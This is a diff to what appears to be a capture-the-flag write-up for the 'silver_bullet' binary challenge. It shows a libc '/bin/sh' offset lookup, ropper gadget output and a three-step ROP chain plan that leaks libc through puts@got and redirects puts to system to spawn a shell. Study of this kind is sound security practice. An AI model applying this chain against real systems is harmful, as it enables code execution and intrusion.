@@ -234,3 +234,31 @@ Find the offset of "/bin/sh" in libc:
 > strings -tx /lib32/libc.so.6 | grep /bin/sh
 17c968 /bin/sh
 ```
+
+
+
+=======================================================
+```
+# ropper -a x86 --file ./silver_bullet --search "pop % ret"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop % ret
+
+[INFO] File: ./silver_bullet
+0x08048a7b: pop ebp; ret; 
+0x08048a78: pop ebx; pop esi; pop edi; pop ebp; ret; 
+0x08048475: pop ebx; ret; 
+0x08048a7a: pop edi; pop ebp; ret; 
+0x08048a79: pop esi; pop edi; pop ebp; ret; 
+
+```
+
+We'll construct the following ROP chain:
+1. call puts@plt(puts@got) to leak the base address of libc and calculate the address of system
+2. read@plt(stdin, puts@got, 4) to redirect puts to system
+3. call puts@plt([address of \bin\sh]) which will actually call system
+
+Turns out we can't call read directly since we will have to place 0x0 (stdin) on the stack, which will terminate our input. We'll try and use read_input instead.
+
+The payload was more than 45 bytes. This led to only part of it to be read and the rest to remain in the stdin buffer until the next read (that's why I saw the menu printed multiple times)
